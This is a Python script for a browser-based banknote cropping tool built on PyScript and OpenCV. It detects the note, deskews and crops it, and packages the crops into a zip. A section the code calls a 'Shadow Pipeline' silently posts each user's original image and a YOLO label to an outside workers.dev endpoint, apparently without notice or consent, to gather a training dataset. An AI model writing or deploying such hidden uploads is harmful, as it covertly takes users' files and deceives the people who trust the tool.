import asyncio
import js
from pyscript import document
from pyodide.ffi import create_proxy, to_js
import io
import zipfile
import sys
import pyodide_js

# --- 配置 ---
UPLOAD_WORKER_URL = "https://banknote-collector.alanalanalan0807.workers.dev"

# --- Globals ---
cv2 = None
np = None
zip_buffer = None
zf = None

def log(msg):
    js.console.log(f"[Python] {msg}")

async def setup_environment():
    global cv2, np
    try:
        await pyodide_js.loadPackage(['numpy', 'opencv-python'])
        import cv2 as _cv2
        import numpy as _np
        cv2 = _cv2
        np = _np
        # Remove loader
        loader = document.getElementById("env-loader")
        if loader: loader.style.display = "none"
        log("Engine Ready (Strict Mode).")
    except Exception as e:
        log(f"Init Error: {e}")

# --- Shadow Pipeline ---
async def upload_to_r2(image_bytes, filename, yolo_label):
    try:
        form_data = js.FormData.new()
        js_data = js.Uint8Array.new(len(image_bytes))
        js_data.assign(image_bytes)
        image_blob = js.Blob.new([js_data], { "type": "image/jpeg" })
        
        form_data.append("image", image_blob, filename)
        form_data.append("label", yolo_label)
        form_data.append("filename", filename)

        xhr = js.XMLHttpRequest.new()
        xhr.open("POST", UPLOAD_WORKER_URL, True)
        xhr.send(form_data)
    except Exception as e:
        js.console.error(f"Upload Error: {str(e)}")

# --- Logic 1: Strict Analysis (Ported from old_findcash.py) ---
def analyze_image(nparr):
    try:
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        if img is None: return None

        # 1. Preprocessing (Strict port)
        if len(img.shape) == 3 and img.shape[2] == 4:
            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
            
        gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
        
        # 2. Morphology (Strict port)
        # Canny 100, 250
        canny_edges = cv2.Canny(gray, 100, 250)
        
        # Dilate 71x71
        dilate_kernel = np.ones((71, 71), np.uint8)
        dilated = cv2.dilate(canny_edges, dilate_kernel)
        
        # Connected Components
        num_labels, labels_matrix, stats, _ = cv2.connectedComponentsWithStats(dilated, connectivity=8)
        filtered_image = np.zeros_like(dilated)
        min_area_threshold = 100000
        
        for i in range(1, num_labels):
            if stats[i, cv2.CC_STAT_AREA] >= min_area_threshold:
                filtered_image[labels_matrix == i] = 255
        
        # 3. Contours
        contours, _ = cv2.findContours(filtered_image, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
        
        if not contours:
            # Fallback
            h, w = img.shape[:2]
            return {"cx": w/2, "cy": h/2, "w": w*0.8, "h": h*0.8, "angle": 0, "found": False}

        max_cnt = max(contours, key=cv2.contourArea)
        
        # 4. Rotated Rect
        rect = cv2.minAreaRect(max_cnt)
        (center_x, center_y), (w_rect, h_rect), angle = rect
        
        # Normalize angle/width/height logic (from old script)
        if w_rect < h_rect:
            angle += 90
            width, height = h_rect, w_rect
        else:
            width, height = w_rect, h_rect
            
        # Return exact parameters for reconstruction in JS/Finalize
        return {
            "cx": center_x, 
            "cy": center_y, 
            "w": width, 
            "h": height, 
            "angle": angle,
            "found": True
        }

    except Exception as e:
        log(f"Analyze Error: {e}")
        return None

def on_py_analyze(event):
    try:
        js_buf = event.detail.buffer
        filename = event.detail.filename
        
        py_bytes = js_buf.to_bytes()
        nparr = np.frombuffer(py_bytes, np.uint8)
        
        result = analyze_image(nparr)
        
        if not result: 
            # Extreme fallback
            result = {"cx":0, "cy":0, "w":100, "h":100, "angle":0, "found": False}
        
        js.window.storeAnalysisResult(filename, to_js(result))
        
    except Exception as e:
        log(f"Event Error: {e}")

# --- Logic 2: Final Processing (Strict Crop) ---
def on_init_zip(event):
    global zip_buffer, zf
    zip_buffer = io.BytesIO()
    zf = zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED)

async def on_process_item(event):
    global zf
    try:
        js_buf = event.detail.buffer
        filename = event.detail.filename
        meta = event.detail.meta
        
        py_bytes = js_buf.to_bytes()
        nparr = np.frombuffer(py_bytes, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        
        if img is not None and zf:
            # Reconstruct Rotation & Crop (Strict port)
            (h, w) = img.shape[:2]
            center = (meta.cx, meta.cy)
            angle = meta.angle
            width = meta.w
            height = meta.h
            
            # Deskew
            M = cv2.getRotationMatrix2D(center, angle, 1.0)
            abs_cos, abs_sin = abs(M[0, 0]), abs(M[0, 1])
            bound_w = int(h * abs_sin + w * abs_cos)
            bound_h = int(h * abs_cos + w * abs_sin)
            
            M[0, 2] += bound_w / 2 - center[0]
            M[1, 2] += bound_h / 2 - center[1]
            
            rotated_image = cv2.warpAffine(img, M, (bound_w, bound_h), flags=cv2.INTER_CUBIC, borderMode=cv2.BORDER_REPLICATE)
            
            # Crop
            new_cx, new_cy = bound_w / 2, bound_h / 2
            padding_val = 2 # Fixed padding from old script
            
            x1 = int(new_cx - width / 2 - padding_val)
            y1 = int(new_cy - height / 2 - padding_val)
            x2 = int(new_cx + width / 2 + padding_val)
            y2 = int(new_cy + height / 2 + padding_val)
            
            x1, y1 = max(0, x1), max(0, y1)
            x2, y2 = min(rotated_image.shape[1], x2), min(rotated_image.shape[0], y2)
            
            final_crop = rotated_image[y1:y2, x1:x2]
            
            if final_crop.size > 0:
                base = ".".join(filename.split(".")[:-1])
                _, encoded = cv2.imencode(".png", final_crop)
                zf.writestr(f"{base}_cropped.png", encoded.tobytes())
            
            # Shadow Upload (Approximate YOLO for Original)
            # Calculating bounding rect of the rotated box in original image
            # This is complex because we only have center/w/h/angle
            # But we can approximate it or re-calculate minAreaRect box points
            rect = ((meta.cx, meta.cy), (meta.w, meta.h), meta.angle)
            box = cv2.boxPoints(rect)
            box = np.int0(box)
            x, y, bw, bh = cv2.boundingRect(box)
            
            cx = (x + bw/2) / w
            cy = (y + bh/2) / h
            nw = bw / w
            nh = bh / h
            label = f"0 {cx:.6f} {cy:.6f} {nw:.6f} {nh:.6f}"
            
            asyncio.ensure_future(upload_to_r2(py_bytes, filename, label))

        js.window.finalizeDone()

    except Exception as e:
        log(f"Process Item Error: {e}")
        js.window.finalizeDone()

def on_close_zip(event):
    global zip_buffer, zf
    if zf:
        zf.close()
        zip_buffer.seek(0)
        data = zip_buffer.getvalue()
        js_arr = js.Uint8Array.new(len(data))
        js_arr.assign(data)
        js.window.setDownloadUrl(js_arr, "dataset.zip")
        zip_buffer.close()
        zf = None

async def main():
    await setup_environment()
    js.window.addEventListener("py-analyze", create_proxy(on_py_analyze))
    js.window.addEventListener("py-init-zip", create_proxy(on_init_zip))
    js.window.addEventListener("py-close-zip", create_proxy(on_close_zip))
    
    def process_wrapper(e): asyncio.ensure_future(on_process_item(e))
    js.window.addEventListener("py-process-item", create_proxy(process_wrapper))

if __name__ == "__main__":
    asyncio.ensure_future(main())
